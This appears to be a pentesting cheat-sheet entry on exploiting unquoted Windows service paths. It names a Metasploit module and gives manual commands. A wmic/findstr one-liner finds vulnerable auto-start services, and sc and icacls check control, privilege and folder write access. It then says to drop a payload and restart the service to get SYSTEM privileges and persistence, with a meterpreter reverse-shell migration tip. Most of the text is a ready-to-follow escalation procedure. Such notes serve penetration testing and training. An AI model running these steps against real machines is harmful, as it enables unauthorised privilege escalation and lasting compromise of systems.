# Unquoted Service Path
We can leverage how Windows searches for a service executable when the service path is unquoted to **escalate privilege** and/or **create persistence**. 

We can use metasploit (need a meterpreter session) or do it mannunally (need a shell). 

### Metasploit
```
exploit/windows/local/unquoted_service_path
```

### Manual Exploitation
In Windows cmd, find a service with the unquoted service path with `wmic`
```
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """
```
* this finds the service name, service display name, executable path, and start mode in all the directories except C:\Windows\ (since  by default there is no such service which has spaces and is unquoted in  this folder); filtering by start mode auto and excluding those with quoted service path
* findstr
  * /i : case insensitive
  * /v : Prints only lines that don't contain a match

Check if we can stop and start the service ourselves:
```
sc stop <service-name>
sc start <service-name>
```

Check if the service run on a higher privilege than what we already have (as a domain user):
```
sc qc <service-name>
# look for SERVICE_START_TIME LocalSystem
```
* this shall give us system privilege

Next, check the write permission in our target folder(s) to see which one we have permission to write into. We're looking for `(M)` (for modification) or `(W)` 
```
icacls "C:/ PATH TO FOLDER"
```
* generally a user wouldn't have access to write to `C:/` 

Write:

<img src="https://miro.medium.com/max/658/1*z1_WPoIRR6p5et1samB4AA.png" width=60%>

No Write:

<img src="https://miro.medium.com/max/700/1*BphXGBP9miqyz-mPMZZbDQ.png" width=80%>

<br>

After choosing the folder path, we can upload our payload here and stop and start the service. 

If using a meterpreter reverse shell payload, it's a good idea to `set AutoRunScript post/windows/manage/migrate` in the multi-handler, to migrate to a different process ASAP after gaining a session, to ensure the stability. 